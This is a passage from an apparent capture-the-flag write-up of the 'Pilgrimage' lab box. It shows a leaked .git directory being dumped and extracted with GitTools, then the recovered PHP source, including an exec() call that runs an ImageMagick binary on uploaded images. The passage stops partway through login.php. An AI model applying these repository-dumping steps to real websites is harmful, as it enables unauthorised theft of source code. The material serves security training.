<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">wip</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/</span><span class="n">master</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">wip</span><span class="o">/</span><span class="n">wtree</span><span class="o">/</span><span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/</span><span class="n">master</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">e1</span><span class="o">/</span><span class="n">a40beebc7035212efdcb15476f9c994e3634a7</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">00</span><span class="o">/</span><span class="mi">00000000000000000000000000000000000000</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">f3</span><span class="o">/</span><span class="n">e708fd3c3689d0f437b2140e08997dbaff6212</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">93</span><span class="o">/</span><span class="n">ed6c0458c9a366473a6bcb919b1033f16e7a8d</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">c2</span><span class="o">/</span><span class="n">cbe0c97b6f3117d4ab516b423542e5fe7757bc</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">6</span><span class="n">c</span><span class="o">/</span><span class="mi">965</span><span class="n">df00a57fd13ad50b5bbe0ae1746cdf6403d</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">dc</span><span class="o">/</span><span class="mi">446514835</span><span class="n">fe49994e27a1c2cf35c9e45916c71</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">46</span><span class="o">/</span><span class="mi">44</span><span class="n">c40a1f15a1eed9a8455e6ac2a0be29b5bf9e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">f1</span><span class="o">/</span><span class="mi">8</span><span class="n">fa9173e9f7c1b2f30f3d20c4a303e18d88548</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">c4</span><span class="o">/</span><span class="mi">18930</span><span class="n">edec4da46019a1bac06ecb6ec6f7975bb</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">36</span><span class="o">/</span><span class="n">c734d44fe952682020fd9762ee9329af51848d</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">b2</span><span class="o">/</span><span class="mf">15e14</span><span class="n">bb4766deff4fb926e1aa080834935d348</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">8</span><span class="n">f</span><span class="o">/</span><span class="mi">155</span><span class="n">a75593279c9723a1b15e5624a304a174af2</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">9</span><span class="n">e</span><span class="o">/</span><span class="n">ace5d0e0c82bff5c93695ac485fe52348c855e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">a7</span><span class="o">/</span><span class="mf">3926e2965989</span><span class="n">a71725516555bcc1fe2c7d4f9e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">98</span><span class="o">/</span><span class="mf">10e80</span><span class="n">fba2c826a142e241d0f65a07ee580eaad</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">8</span><span class="n">dbf75d02f0d622ac4ff9e402175eacbbaeddd</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">81</span><span class="o">/</span><span class="mi">703757</span><span class="n">c43fe30d0f3c6157a1c20f0fea7331fc</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">76</span><span class="o">/</span><span class="n">a559577d4f759fff6af1249b4a277f352822d5</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">ff</span><span class="o">/</span><span class="n">dbd328a3efc5dad2a97be47e64d341d696576c</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">f2</span><span class="o">/</span><span class="n">b67ac629e09e9143d201e9e7ba6a83ee02d66e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">8</span><span class="n">a</span><span class="o">/</span><span class="mi">62</span><span class="n">aac3b8e9105766f3873443758b7ddf18d838</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">e9</span><span class="o">/</span><span class="mi">2</span><span class="n">c0655b5ac3ec2bfbdd015294ddcbe054fb783</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">c2</span><span class="o">/</span><span class="n">a4c2fd4e5b2374c6e212d1800097e3b30ff4e2</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">88</span><span class="o">/</span><span class="mi">16</span><span class="n">d69710c5d2ee58db84afa5691495878f4ee1</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">96</span><span class="o">/</span><span class="mf">3349e4</span><span class="n">f7a7a35c8f97043c20190efbe20d159a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">2</span><span class="n">f</span><span class="o">/</span><span class="mf">9156e434</span><span class="n">cfa6204c9d48733ee5c0d86a8a4e23</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">b6</span><span class="o">/</span><span class="n">c438e8ba16336198c2e62fee337e126257b909</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="n">dbdd149e3a657bc59750b35e1136af861a579f</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">c3</span><span class="o">/</span><span class="mi">27</span><span class="n">c2362dd4f8eb980f6908c49f8ef014d19568</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">8</span><span class="n">e</span><span class="o">/</span><span class="mi">42</span><span class="n">bc52e73caeaef5e58ae0d9844579f8e1ae18</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">5</span><span class="n">f</span><span class="o">/</span><span class="n">ec5e0946296a0f09badeb08571519918c3da77</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">50</span><span class="o">/</span><span class="mi">210</span><span class="n">eb2a1620ef4c4104c16ee7fac16a2c83987</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">19</span><span class="n">fc1c747e6278bbd51a30de28b3fcccbd848a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">54</span><span class="o">/</span><span class="mi">4</span><span class="n">d28df79fe7e6757328f7ecddf37a9aac17322</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">1</span><span class="n">f</span><span class="o">/</span><span class="mi">8</span><span class="n">ddab827030fbc81b7cb4441ec4c9809a48bc1</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">47</span><span class="o">/</span><span class="mi">6364752</span><span class="n">c5fa7ad9aa10f471dc955aac3d3cf34</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">b4</span><span class="o">/</span><span class="mi">21518638</span><span class="n">bfb4725d72cc0980d8dcaf6074abe7</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">49</span><span class="o">/</span><span class="n">cd436cf92cc28645e5a8be4b1973683c95c537</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">1</span><span class="n">f</span><span class="o">/</span><span class="mi">2</span><span class="n">ef7cfabc9cf1d117d7a88f3a63cadbb40cca3</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">1150</span><span class="n">acdd01bbbef94dfb9da9f79476bfbb16fc</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">d9dfca08306027b234ddc2166c838de9301487</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="mi">90</span><span class="n">fe8e067b4e75012c097a088073dd1d3e75a4</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">c4</span><span class="o">/</span><span class="mi">3565452792</span><span class="n">f19d2cf2340266dbecb82f2a0571</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">4</span><span class="n">ee966c8b135ea3e299b7ca49c450e78870b59</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">fb</span><span class="o">/</span><span class="n">f9e44d80c149c822db0b575dbfdc4625744aa4</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">2</span><span class="n">b</span><span class="o">/</span><span class="mf">95e3</span><span class="n">c61cd8f7f0b7887a8151207b204d576e14</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">a5</span><span class="o">/</span><span class="mi">29</span><span class="n">d883c76f026420aed8dbcbd4c245ed9a7c0b</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">12310101010101010101410301010101210101</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">03032323230123232323212123212303632303</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">21236303230321632123036767012147470701</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">47</span><span class="o">/</span><span class="mi">07412547250503474341056701016565070147</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">41</span><span class="o">/</span><span class="mi">61416543747052570741470565674701054165</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">65</span><span class="o">/</span><span class="mi">43450543454147054147414565014170505650</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">54</span><span class="o">/</span><span class="mi">74547454747476767476767676767236323632</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">36</span><span class="o">/</span><span class="mi">76745054545454545456545454545454545454</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="mi">76</span><span class="o">/</span><span class="mi">76701676767670105676767672167676767010</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">cd</span><span class="o">/</span><span class="mf">2774e97</span><span class="n">bfe313f2ec2b8dc8285ec90688c5adb</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Downloaded</span><span class="p">:</span> <span class="n">objects</span><span class="o">/</span><span class="n">fa</span><span class="o">/</span><span class="mi">175</span><span class="n">a75d40a7be5c3c5dee79b36f626de328f2e</span>
<span class="nd">elswix@kali</span><span class="err">$</span>
</pre></div>

Now, with the <code>extractor.sh</code> tool, let's extract all files from the repository:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">GitTools</span><span class="o">/</span><span class="n">Extractor</span><span class="o">/</span><span class="n">extractor</span><span class="o">.</span><span class="n">sh</span> <span class="n">Pilgrimage</span><span class="o">/</span> <span class="n">PilgrimageSC</span>
</pre></div>

When accessing the <code>PilgrimageSC</code> directory, we encounter the following subdirectory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">total</span> <span class="mi">4</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="mi">0</span><span class="o">-</span><span class="n">e1a40beebc7035212efdcb15476f9c994e3634a7</span>
</pre></div>

Let's access it and list its contents:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cd</span> <span class="mi">0</span><span class="o">-</span><span class="n">e1a40beebc7035212efdcb15476f9c994e3634a7</span>
<span class="n">total</span> <span class="mi">26964</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">assets</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>      <span class="mi">205</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">commit</span><span class="o">-</span><span class="n">meta</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">5538</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">dashboard</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">9250</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">6822</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">login</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>       <span class="mi">98</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">logout</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">27555008</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">magick</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">6836</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">register</span><span class="o">.</span><span class="n">php</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">elswix</span> <span class="n">elswix</span>     <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">09</span><span class="p">:</span><span class="mi">34</span> <span class="n">vendor</span>
</pre></div>

Finally, we gained access to the website source code by exploiting the <code>.git</code> directory.<br/><br/>
By reading the source code, I found where the images are being shrunked. Here is the php code of the <code>index.php</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">require_once</span> <span class="s2">"assets/bulletproof.php"</span><span class="p">;</span>

<span class="k">function</span> <span class="nf">isAuthenticated</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]));</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">returnUsername</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Bulletproof\Image</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$image</span><span class="p">[</span><span class="s2">"toConvert"</span><span class="p">])</span> <span class="p">{</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setLocation</span><span class="p">(</span><span class="s2">"/var/www/pilgrimage.htb/tmp"</span><span class="p">);</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setSize</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">4000000</span><span class="p">);</span>
    <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">setMime</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'png'</span><span class="p">,</span><span class="s1">'jpeg'</span><span class="p">));</span>
    <span class="nv">$upload</span> <span class="o">=</span> <span class="nv">$image</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$upload</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$mime</span> <span class="o">=</span> <span class="s2">".png"</span><span class="p">;</span>
      <span class="nv">$imagePath</span> <span class="o">=</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getFullPath</span><span class="p">();</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$imagePath</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"image/jpeg"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$mime</span> <span class="o">=</span> <span class="s2">".jpeg"</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nv">$newname</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>
      <span class="nb">exec</span><span class="p">(</span><span class="s2">"/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/"</span> <span class="o">.</span> <span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getName</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$mime</span> <span class="o">.</span> <span class="s2">" -resize 50% /var/www/pilgrimage.htb/shrunk/"</span> <span class="o">.</span> <span class="nv">$newname</span> <span class="o">.</span> <span class="nv">$mime</span><span class="p">);</span>
      <span class="nb">unlink</span><span class="p">(</span><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">getFullPath</span><span class="p">());</span>
      <span class="nv">$upload_path</span> <span class="o">=</span> <span class="s2">"http://pilgrimage.htb/shrunk/"</span> <span class="o">.</span> <span class="nv">$newname</span> <span class="o">.</span> <span class="nv">$mime</span><span class="p">;</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'sqlite:/var/db/pilgrimage'</span><span class="p">);</span>
        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO `images` (url,original,username) VALUES (?,?,?)"</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$upload_path</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"toConvert"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">],</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]));</span>
      <span class="p">}</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /?message="</span> <span class="o">.</span> <span class="nv">$upload_path</span> <span class="o">.</span> <span class="s2">"&amp;status=success"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /?message=Image shrink failed&amp;status=fail"</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /?message=Image shrink failed&amp;status=fail"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></div>

Speciffically at this line, the uploaded image is being converted:<br/><br/>
<div class="highlight"><pre><span></span><span class="x">exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload-&gt;getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);</span>
</pre></div>

It is using a binary named <code>magick</code>. This binary is included in the git repository, so I found it in the current directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="o">./</span><span class="n">magick</span>
<span class="n">magick</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">2.6.32</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">9</span><span class="n">fdbc145689e0fb79cb7291203431012ae8e1911</span><span class="p">,</span> <span class="n">stripped</span>
</pre></div>

Before analysing the binary, let's take a look at the <code>login.php</code> file:<br/><br/>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /dashboard.php"</span><span class="p">);</span>
  <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'POST'</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>

  <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'sqlite:/var/db/pilgrimage'</span><span class="p">);</span>
  <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = ? and password = ?"</span><span class="p">);</span>
